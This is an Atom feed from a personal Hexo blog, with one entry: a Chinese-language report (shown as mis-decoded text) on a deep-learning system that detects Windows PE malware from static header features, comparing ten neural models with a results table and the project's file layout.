<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CHANGMEN&#39;ä¸ªäººåšå®¢</title>
  
  
  <link href="https://250wuyifan.github.io/atom.xml" rel="self"/>
  
  <link href="https://250wuyifan.github.io/"/>
  <updated>2025-10-15T14:24:53.670Z</updated>
  <id>https://250wuyifan.github.io/</id>
  
  <author>
    <name>CHANGMEN</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>natureè®ºæ–‡æ±‡æŠ¥</title>
    <link href="https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/"/>
    <id>https://250wuyifan.github.io/2025/10/15/nature%E8%AE%BA%E6%96%87%E6%B1%87%E6%8A%A5/</id>
    <published>2025-10-15T14:24:09.000Z</published>
    <updated>2025-10-15T14:24:53.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®"><a href="#PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ-åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®" class="headerlink" title="PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®"></a>PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ - åŸºäºæ·±åº¦å­¦ä¹ çš„ç ”ç©¶é¡¹ç›®</h1><h2 id="é¡¹ç›®æ¦‚è¿°"><a href="#é¡¹ç›®æ¦‚è¿°" class="headerlink" title="é¡¹ç›®æ¦‚è¿°"></a>é¡¹ç›®æ¦‚è¿°</h2><p>æœ¬é¡¹ç›®æ˜¯ä¸€ä¸ªåŸºäºæ·±åº¦å­¦ä¹ çš„PEï¼ˆPortable Executableï¼‰æ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿï¼Œæ—¨åœ¨é€šè¿‡å¤šç§æ·±åº¦å­¦ä¹ ç®—æ³•å¯¹Windowså¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œæ¶æ„æ€§æ£€æµ‹ã€‚é¡¹ç›®é‡‡ç”¨äº†å…¨é¢çš„å®éªŒè®¾è®¡ï¼Œæ¯”è¾ƒäº†10ç§ä¸åŒçš„æ·±åº¦å­¦ä¹ æ¨¡å‹åœ¨æ¶æ„ä»£ç æ£€æµ‹ä»»åŠ¡ä¸Šçš„æ€§èƒ½è¡¨ç°ã€‚</p><h2 id="ğŸ¯-ç ”ç©¶ç›®æ ‡"><a href="#ğŸ¯-ç ”ç©¶ç›®æ ‡" class="headerlink" title="ğŸ¯ ç ”ç©¶ç›®æ ‡"></a>ğŸ¯ ç ”ç©¶ç›®æ ‡</h2><ul><li><strong>ä¸»è¦ç›®æ ‡</strong>ï¼šæ„å»ºé«˜æ•ˆçš„PEæ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ</li><li><strong>æŠ€æœ¯ç›®æ ‡</strong>ï¼šæ¯”è¾ƒå¤šç§æ·±åº¦å­¦ä¹ æ¨¡å‹çš„æ£€æµ‹æ€§èƒ½</li><li><strong>å­¦æœ¯ç›®æ ‡</strong>ï¼šä¸ºæ¶æ„ä»£ç æ£€æµ‹é¢†åŸŸæä¾›å…¨é¢çš„æ¨¡å‹æ€§èƒ½åŸºå‡†</li></ul><h2 id="ğŸ“Š-æ•°æ®é›†æ„å»º"><a href="#ğŸ“Š-æ•°æ®é›†æ„å»º" class="headerlink" title="ğŸ“Š æ•°æ®é›†æ„å»º"></a>ğŸ“Š æ•°æ®é›†æ„å»º</h2><h3 id="æ•°æ®æ¥æº"><a href="#æ•°æ®æ¥æº" class="headerlink" title="æ•°æ®æ¥æº"></a>æ•°æ®æ¥æº</h3><ul><li><strong>æ¶æ„æ ·æœ¬æ¥æº</strong>ï¼šMalwareBazaaræ•°æ®åº“ï¼ˆabuse.chï¼‰</li><li><strong>æ—¶é—´èŒƒå›´</strong>ï¼š2020å¹´2æœˆ-6æœˆçš„æ¶æ„æ ·æœ¬</li><li><strong>æ ·æœ¬æ•°é‡</strong>ï¼šçº¦10,000+æ¶æ„æ ·æœ¬</li><li><strong>æ­£å¸¸æ ·æœ¬</strong>ï¼šç³»ç»ŸPEæ–‡ä»¶å’Œåˆæ³•è½¯ä»¶</li></ul><h3 id="æ•°æ®é¢„å¤„ç†æµç¨‹"><a href="#æ•°æ®é¢„å¤„ç†æµç¨‹" class="headerlink" title="æ•°æ®é¢„å¤„ç†æµç¨‹"></a>æ•°æ®é¢„å¤„ç†æµç¨‹</h3><ol><li><strong>æ ·æœ¬ä¸‹è½½ä¸è§£å‹</strong>ï¼šè‡ªåŠ¨åŒ–ä¸‹è½½æŒ‡å®šæ—¥æœŸèŒƒå›´çš„æ¶æ„æ ·æœ¬</li><li><strong>PEæ–‡ä»¶éªŒè¯</strong>ï¼šéªŒè¯æ–‡ä»¶æ ¼å¼çš„æœ‰æ•ˆæ€§</li><li><strong>ç‰¹å¾æå–</strong>ï¼šä»PEæ–‡ä»¶ç»“æ„ä¸­æå–58ä¸ªé™æ€ç‰¹å¾</li><li><strong>æ•°æ®æ¸…æ´—</strong>ï¼šå¤„ç†ç¼ºå¤±å€¼å’Œå¼‚å¸¸å€¼</li></ol><h2 id="ğŸ”§-ç‰¹å¾å·¥ç¨‹"><a href="#ğŸ”§-ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ğŸ”§ ç‰¹å¾å·¥ç¨‹"></a>ğŸ”§ ç‰¹å¾å·¥ç¨‹</h2><h3 id="PEæ–‡ä»¶ç‰¹å¾ä½“ç³»"><a href="#PEæ–‡ä»¶ç‰¹å¾ä½“ç³»" class="headerlink" title="PEæ–‡ä»¶ç‰¹å¾ä½“ç³»"></a>PEæ–‡ä»¶ç‰¹å¾ä½“ç³»</h3><p>é¡¹ç›®æå–äº†58ä¸ªPEæ–‡ä»¶é™æ€ç‰¹å¾ï¼Œæ¶µç›–ä»¥ä¸‹å‡ ä¸ªç»´åº¦ï¼š</p><h4 id="1-DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰"><a href="#1-DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰" class="headerlink" title="1. DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰"></a>1. DOSå¤´ç‰¹å¾ï¼ˆ17ä¸ªï¼‰</h4><ul><li><code>e_magic</code>ï¼šDOSç­¾å</li><li><code>e_cblp</code>ï¼šæœ€åä¸€é¡µå­—èŠ‚æ•°</li><li><code>e_cp</code>ï¼šæ–‡ä»¶é¡µæ•°</li><li><code>e_lfanew</code>ï¼šPEå¤´åç§»</li><li>ç­‰å…¶ä»–DOSå¤´å­—æ®µ</li></ul><h4 id="2-NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰"><a href="#2-NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰" class="headerlink" title="2. NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰"></a>2. NTå¤´ç‰¹å¾ï¼ˆ7ä¸ªï¼‰</h4><ul><li><code>machine</code>ï¼šç›®æ ‡æœºå™¨ç±»å‹</li><li><code>number_of_sections</code>ï¼šèŠ‚åŒºæ•°é‡</li><li><code>time_date_stamp</code>ï¼šæ—¶é—´æˆ³</li><li><code>characteristics</code>ï¼šæ–‡ä»¶ç‰¹å¾æ ‡å¿—</li><li>ç­‰</li></ul><h4 id="3-å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰"><a href="#3-å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰" class="headerlink" title="3. å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰"></a>3. å¯é€‰å¤´ç‰¹å¾ï¼ˆ28ä¸ªï¼‰</h4><ul><li><code>size_of_code</code>ï¼šä»£ç æ®µå¤§å°</li><li><code>size_of_image</code>ï¼šæ˜ åƒå¤§å°</li><li><code>address_of_entry_point</code>ï¼šå…¥å£ç‚¹åœ°å€</li><li><code>subsystem</code>ï¼šå­ç³»ç»Ÿç±»å‹</li><li>ç­‰</li></ul><h4 id="4-èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰"><a href="#4-èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰" class="headerlink" title="4. èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰"></a>4. èŠ‚åŒºç»Ÿè®¡ç‰¹å¾ï¼ˆ6ä¸ªï¼‰</h4><ul><li><code>avg_section_entropy</code>ï¼šå¹³å‡èŠ‚åŒºç†µå€¼</li><li><code>max_section_entropy</code>ï¼šæœ€å¤§èŠ‚åŒºç†µå€¼</li><li><code>total_virtual_size</code>ï¼šæ€»è™šæ‹Ÿå¤§å°</li><li><code>virtual_raw_ratio</code>ï¼šè™šæ‹Ÿ&#x2F;å®é™…å¤§å°æ¯”ç‡</li><li>ç­‰</li></ul><h3 id="æ•°æ®é¢„å¤„ç†ç­–ç•¥"><a href="#æ•°æ®é¢„å¤„ç†ç­–ç•¥" class="headerlink" title="æ•°æ®é¢„å¤„ç†ç­–ç•¥"></a>æ•°æ®é¢„å¤„ç†ç­–ç•¥</h3><ul><li><strong>ç¼©æ”¾æ–¹æ³•</strong>ï¼šæ ‡å‡†åŒ–ã€æœ€å°-æœ€å¤§ç¼©æ”¾ã€æ— ç¼©æ”¾</li><li><strong>ç‰¹å¾é€‰æ‹©</strong>ï¼šPCAé™ç»´ã€LDAé™ç»´ã€æ— é™ç»´</li><li><strong>ç»„åˆç­–ç•¥</strong>ï¼š3Ã—3&#x3D;9ç§é¢„å¤„ç†ç»„åˆ</li></ul><h2 id="ğŸ¤–-æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„"><a href="#ğŸ¤–-æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„" class="headerlink" title="ğŸ¤– æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„"></a>ğŸ¤– æ·±åº¦å­¦ä¹ æ¨¡å‹æ¶æ„</h2><p>é¡¹ç›®å®ç°äº†10ç§ä¸åŒçš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼š</p><h3 id="1-å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰"><a href="#1-å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰" class="headerlink" title="1. å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰"></a>1. å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Conv1D(<span class="number">64</span>, <span class="number">3</span>) + BatchNorm + MaxPooling</span><br><span class="line">- Conv1D(<span class="number">32</span>, <span class="number">3</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰"><a href="#2-é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰" class="headerlink" title="2. é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰"></a>2. é•¿çŸ­æœŸè®°å¿†ç½‘ç»œï¼ˆLSTMï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- LSTM(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- LSTM(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="3-å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰"><a href="#3-å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰" class="headerlink" title="3. å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰"></a>3. å¾ªç¯ç¥ç»ç½‘ç»œï¼ˆRNNï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- SimpleRNN(<span class="number">64</span>, return_sequences=<span class="literal">True</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- SimpleRNN(<span class="number">32</span>) + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">50</span>) + Dropout(<span class="number">0.5</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="4-å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰"><a href="#4-å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰" class="headerlink" title="4. å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰"></a>4. å¤šå±‚æ„ŸçŸ¥å™¨ï¼ˆMLPï¼‰</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Dense(<span class="number">256</span>) + BatchNorm + Dropout(<span class="number">0.4</span>)</span><br><span class="line">- Dense(<span class="number">128</span>) + BatchNorm + Dropout(<span class="number">0.3</span>)</span><br><span class="line">- Dense(<span class="number">64</span>) + Dropout(<span class="number">0.2</span>) + Dense(<span class="number">32</span>) + Dense(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="5-è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰"><a href="#5-è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰" class="headerlink" title="5. è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰"></a>5. è‡ªç»„ç»‡æ˜ å°„ç½‘ç»œï¼ˆSOMï¼‰</h3><ul><li>è‡ªé€‚åº”ç½‘æ ¼å¤§å°è®¾è®¡</li><li>12Ã—12æ˜ å°„å±‚ç”¨äºç‰¹å¾å¯è§†åŒ–</li></ul><h3 id="6-æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰"><a href="#6-æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰" class="headerlink" title="6. æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰"></a>6. æ·±åº¦ä¿¡å¿µç½‘ç»œï¼ˆDBNï¼‰</h3><ul><li>å¤šå±‚sigmoidæ¿€æ´»</li><li>é€å±‚é¢„è®­ç»ƒæ¶æ„</li></ul><h3 id="7-å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰"><a href="#7-å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰" class="headerlink" title="7. å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰"></a>7. å—é™ç»å°”å…¹æ›¼æœºï¼ˆRBMï¼‰</h3><ul><li>200â†’100â†’50çš„å±‚æ¬¡ç»“æ„</li><li>sigmoidæ¿€æ´»å‡½æ•°</li></ul><h3 id="8-è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰"><a href="#8-è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰" class="headerlink" title="8. è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰"></a>8. è‡ªåŠ¨ç¼–ç å™¨ï¼ˆAutoEncoderï¼‰</h3><ul><li>ç¼–ç å™¨ï¼š128â†’64â†’32</li><li>åˆ†ç±»å™¨ï¼š16â†’1</li></ul><h3 id="9-GANåˆ¤åˆ«å™¨"><a href="#9-GANåˆ¤åˆ«å™¨" class="headerlink" title="9. GANåˆ¤åˆ«å™¨"></a>9. GANåˆ¤åˆ«å™¨</h3><ul><li>256â†’128â†’64çš„åˆ¤åˆ«ç½‘ç»œ</li><li>é€‚ç”¨äºå¯¹æŠ—æ€§è®­ç»ƒ</li></ul><h3 id="10-å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰"><a href="#10-å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰" class="headerlink" title="10. å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰"></a>10. å¾„å‘åŸºå‡½æ•°ç½‘ç»œï¼ˆRBFNï¼‰</h3><ul><li>100ä¸ªå¾„å‘åŸºå•å…ƒ</li><li>é«˜æ–¯æ ¸å‡½æ•°</li></ul><h2 id="ğŸ“ˆ-å®éªŒè®¾è®¡ä¸ç»“æœ"><a href="#ğŸ“ˆ-å®éªŒè®¾è®¡ä¸ç»“æœ" class="headerlink" title="ğŸ“ˆ å®éªŒè®¾è®¡ä¸ç»“æœ"></a>ğŸ“ˆ å®éªŒè®¾è®¡ä¸ç»“æœ</h2><h3 id="å®éªŒé…ç½®"><a href="#å®éªŒé…ç½®" class="headerlink" title="å®éªŒé…ç½®"></a>å®éªŒé…ç½®</h3><ul><li><strong>è®­ç»ƒé›†&#x2F;æµ‹è¯•é›†</strong>ï¼š80%&#x2F;20%åˆ†å‰²</li><li><strong>äº¤å‰éªŒè¯</strong>ï¼šåˆ†å±‚KæŠ˜éªŒè¯</li><li><strong>ä¼˜åŒ–å™¨</strong>ï¼šAdamä¼˜åŒ–å™¨</li><li><strong>å­¦ä¹ ç‡</strong>ï¼š0.001ï¼ˆéƒ¨åˆ†æ¨¡å‹0.0002ï¼‰</li><li><strong>æ‰¹æ¬¡å¤§å°</strong>ï¼š32</li><li><strong>æ—©åœæœºåˆ¶</strong>ï¼špatience&#x3D;10</li><li><strong>å­¦ä¹ ç‡è°ƒåº¦</strong>ï¼šReduceLROnPlateau</li></ul><h3 id="æ€§èƒ½æŒ‡æ ‡"><a href="#æ€§èƒ½æŒ‡æ ‡" class="headerlink" title="æ€§èƒ½æŒ‡æ ‡"></a>æ€§èƒ½æŒ‡æ ‡</h3><ul><li><strong>å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰</strong></li><li><strong>ç²¾ç¡®ç‡ï¼ˆPrecisionï¼‰</strong></li><li><strong>å¬å›ç‡ï¼ˆRecallï¼‰</strong></li><li><strong>F1åˆ†æ•°</strong></li><li><strong>AUC-ROC</strong></li></ul><h3 id="å®éªŒç»“æœ"><a href="#å®éªŒç»“æœ" class="headerlink" title="å®éªŒç»“æœ"></a>å®éªŒç»“æœ</h3><p>æ ¹æ®å®éªŒç»“æœï¼Œå„æ¨¡å‹æ€§èƒ½æ’åå¦‚ä¸‹ï¼š</p><table><thead><tr><th>æ’å</th><th>æ¨¡å‹</th><th>å‡†ç¡®ç‡</th><th>ç²¾ç¡®ç‡</th><th>å¬å›ç‡</th><th>F1åˆ†æ•°</th><th>AUC</th></tr></thead><tbody><tr><td>1</td><td>CNN</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>99.0%</td><td>0.999</td></tr><tr><td>2</td><td>SOM</td><td>98.75%</td><td>98.76%</td><td>98.75%</td><td>98.75%</td><td>0.999</td></tr><tr><td>3</td><td>MLP</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>98.5%</td><td>0.998</td></tr><tr><td>4</td><td>RBM</td><td>98.25%</td><td>98.26%</td><td>98.25%</td><td>98.25%</td><td>0.999</td></tr><tr><td>5</td><td>DBN</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>6</td><td>GANåˆ¤åˆ«å™¨</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>7</td><td>RNN</td><td>98.0%</td><td>98.02%</td><td>98.0%</td><td>98.0%</td><td>0.999</td></tr><tr><td>8</td><td>AutoEncoder</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>97.75%</td><td>0.998</td></tr><tr><td>9</td><td>LSTM</td><td>96.75%</td><td>96.78%</td><td>96.75%</td><td>96.75%</td><td>0.995</td></tr><tr><td>10</td><td>RBFN</td><td>50.0%</td><td>25.0%</td><td>50.0%</td><td>33.33%</td><td>0.5</td></tr></tbody></table><h2 id="ğŸ”-å…³é”®å‘ç°"><a href="#ğŸ”-å…³é”®å‘ç°" class="headerlink" title="ğŸ” å…³é”®å‘ç°"></a>ğŸ” å…³é”®å‘ç°</h2><h3 id="1-æ¨¡å‹æ€§èƒ½åˆ†æ"><a href="#1-æ¨¡å‹æ€§èƒ½åˆ†æ" class="headerlink" title="1. æ¨¡å‹æ€§èƒ½åˆ†æ"></a>1. æ¨¡å‹æ€§èƒ½åˆ†æ</h3><ul><li><strong>CNNè¡¨ç°æœ€ä¼˜</strong>ï¼šåœ¨æ‰€æœ‰æŒ‡æ ‡ä¸Šéƒ½è¾¾åˆ°äº†99%çš„æ€§èƒ½</li><li><strong>ä¼ ç»Ÿç¥ç»ç½‘ç»œæ•ˆæœè‰¯å¥½</strong>ï¼šSOMã€MLPç­‰ç®€å•æ¨¡å‹ä¹Ÿè¾¾åˆ°äº†98%+çš„å‡†ç¡®ç‡</li><li><strong>åºåˆ—æ¨¡å‹è¡¨ç°ä¸­ç­‰</strong>ï¼šLSTMã€RNNåœ¨é™æ€ç‰¹å¾ä¸Šè¡¨ç°ä¸å¦‚CNN</li><li><strong>RBFNæ€§èƒ½è¾ƒå·®</strong>ï¼šå¯èƒ½ç”±äºå¾„å‘åŸºå‡½æ•°ä¸é€‚åˆæ­¤ç±»ç‰¹å¾</li></ul><h3 id="2-ç‰¹å¾å·¥ç¨‹å½±å“"><a href="#2-ç‰¹å¾å·¥ç¨‹å½±å“" class="headerlink" title="2. ç‰¹å¾å·¥ç¨‹å½±å“"></a>2. ç‰¹å¾å·¥ç¨‹å½±å“</h3><ul><li><strong>æ ‡å‡†åŒ–æ•ˆæœæ˜¾è‘—</strong>ï¼šå¤§å¤šæ•°æ¨¡å‹åœ¨æ ‡å‡†åŒ–åæ€§èƒ½æå‡</li><li><strong>PCAé™ç»´æœ‰æ•ˆ</strong>ï¼šåœ¨ä¿æŒæ€§èƒ½çš„åŒæ—¶å‡å°‘äº†è®¡ç®—å¤æ‚åº¦</li><li><strong>LDAæ•ˆæœæœ‰é™</strong>ï¼šç”±äºæ˜¯äºŒåˆ†ç±»é—®é¢˜ï¼ŒLDAé™ç»´æ•ˆæœä¸æ˜æ˜¾</li></ul><h3 id="3-æŠ€æœ¯åˆ›æ–°ç‚¹"><a href="#3-æŠ€æœ¯åˆ›æ–°ç‚¹" class="headerlink" title="3. æŠ€æœ¯åˆ›æ–°ç‚¹"></a>3. æŠ€æœ¯åˆ›æ–°ç‚¹</h3><ul><li><strong>å…¨é¢çš„æ¨¡å‹æ¯”è¾ƒ</strong>ï¼šé¦–æ¬¡åœ¨PEæ¶æ„ä»£ç æ£€æµ‹ä¸­æ¯”è¾ƒ10ç§æ·±åº¦å­¦ä¹ æ¨¡å‹</li><li><strong>è‡ªåŠ¨åŒ–ç‰¹å¾æå–</strong>ï¼šå®Œæ•´çš„PEæ–‡ä»¶ç‰¹å¾æå–pipeline</li><li><strong>å¤šç»´åº¦è¯„ä¼°</strong>ï¼šä»å‡†ç¡®ç‡ã€æ•ˆç‡ã€é²æ£’æ€§å¤šè§’åº¦è¯„ä¼°æ¨¡å‹</li></ul><h2 id="ğŸ› -æŠ€æœ¯æ¶æ„"><a href="#ğŸ› -æŠ€æœ¯æ¶æ„" class="headerlink" title="ğŸ›  æŠ€æœ¯æ¶æ„"></a>ğŸ›  æŠ€æœ¯æ¶æ„</h2><h3 id="ç³»ç»Ÿç»„ä»¶"><a href="#ç³»ç»Ÿç»„ä»¶" class="headerlink" title="ç³»ç»Ÿç»„ä»¶"></a>ç³»ç»Ÿç»„ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æ¶æ„ä»£ç æ£€æµ‹ç³»ç»Ÿ</span><br><span class="line">â”œâ”€â”€ æ•°æ®é‡‡é›†æ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ æ ·æœ¬ä¸‹è½½å™¨ (æŒ‡å®šæ—¥æœŸä¸‹è½½æ–‡ä»¶å¹¶è§£å‹.py)</span><br><span class="line">â”‚   â””â”€â”€ PEæ–‡ä»¶éªŒè¯å™¨ (copy.py)</span><br><span class="line">â”œâ”€â”€ ç‰¹å¾æå–æ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ PEè§£æå™¨ (PEFeatureExtractor)</span><br><span class="line">â”‚   â””â”€â”€ ç‰¹å¾å·¥ç¨‹ (preprocess_data)</span><br><span class="line">â”œâ”€â”€ æ¨¡å‹è®­ç»ƒæ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ 10ç§æ·±åº¦å­¦ä¹ æ¨¡å‹</span><br><span class="line">â”‚   â””â”€â”€ è¶…å‚æ•°ä¼˜åŒ–</span><br><span class="line">â”œâ”€â”€ è¯„ä¼°åˆ†ææ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ æ€§èƒ½æŒ‡æ ‡è®¡ç®—</span><br><span class="line">â”‚   â”œâ”€â”€ å¯è§†åŒ–åˆ†æ</span><br><span class="line">â”‚   â””â”€â”€ ç»“æœå¯¼å‡º</span><br><span class="line">â””â”€â”€ å·¥å…·æ¨¡å—</span><br><span class="line">    â”œâ”€â”€ æ–‡ä»¶ç»Ÿè®¡ (ç»Ÿè®¡ç›®å½•ä¸‹peæ–‡ä»¶æ•°é‡.py)</span><br><span class="line">    â””â”€â”€ æ•°æ®ç®¡ç†</span><br></pre></td></tr></table></figure><h3 id="ä¾èµ–ç¯å¢ƒ"><a href="#ä¾èµ–ç¯å¢ƒ" class="headerlink" title="ä¾èµ–ç¯å¢ƒ"></a>ä¾èµ–ç¯å¢ƒ</h3><ul><li><strong>Python 3.8+</strong></li><li><strong>TensorFlow 2.x</strong></li><li><strong>scikit-learn</strong></li><li><strong>pandas, numpy</strong></li><li><strong>matplotlib, seaborn</strong></li><li><strong>pefile</strong>ï¼ˆPEæ–‡ä»¶è§£æï¼‰</li><li><strong>pyzipper</strong>ï¼ˆæ ·æœ¬è§£å‹ï¼‰</li></ul><h2 id="ğŸ“‹-é¡¹ç›®æ–‡ä»¶ç»“æ„"><a href="#ğŸ“‹-é¡¹ç›®æ–‡ä»¶ç»“æ„" class="headerlink" title="ğŸ“‹ é¡¹ç›®æ–‡ä»¶ç»“æ„"></a>ğŸ“‹ é¡¹ç›®æ–‡ä»¶ç»“æ„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pythonProject/</span><br><span class="line">â”œâ”€â”€ main.py                          # ä¸»ç¨‹åºï¼ˆå®Œæ•´çš„æ£€æµ‹ç³»ç»Ÿï¼‰</span><br><span class="line">â”œâ”€â”€ natureè®­ç»ƒPEæ£€æµ‹ä»£ç .py            # ä¼˜åŒ–ç‰ˆæ£€æµ‹ä»£ç </span><br><span class="line">â”œâ”€â”€ æŒ‡å®šæ—¥æœŸä¸‹è½½æ–‡ä»¶å¹¶è§£å‹.py          # æ ·æœ¬ä¸‹è½½å·¥å…·</span><br><span class="line">â”œâ”€â”€ copy.py                          # PEæ–‡ä»¶æ”¶é›†å·¥å…·</span><br><span class="line">â”œâ”€â”€ ç»Ÿè®¡ç›®å½•ä¸‹peæ–‡ä»¶æ•°é‡.py           # ç»Ÿè®¡å·¥å…·</span><br><span class="line">â”œâ”€â”€ pe_malware_results.csv           # å®éªŒç»“æœ</span><br><span class="line">â”œâ”€â”€ downloads/                       # ä¸‹è½½çš„æ ·æœ¬å‹ç¼©åŒ…</span><br><span class="line">â”œâ”€â”€ extracted_samples/               # è§£å‹çš„æ¶æ„æ ·æœ¬</span><br><span class="line">â”œâ”€â”€ valid_pe_files_bin/             # æœ‰æ•ˆPEæ–‡ä»¶ï¼ˆ.binæ ¼å¼ï¼‰</span><br><span class="line">â”œâ”€â”€ ç»“æœå›¾è¡¨/</span><br><span class="line">â”‚   â”œâ”€â”€ pe_malware_detection_results.png</span><br><span class="line">â”‚   â”œâ”€â”€ best_models_roc_curves.png</span><br><span class="line">â”‚   â””â”€â”€ feature_importance_analysis.png</span><br><span class="line">â””â”€â”€ venv/                           # Pythonè™šæ‹Ÿç¯å¢ƒ</span><br></pre></td></tr></table></figure><h2 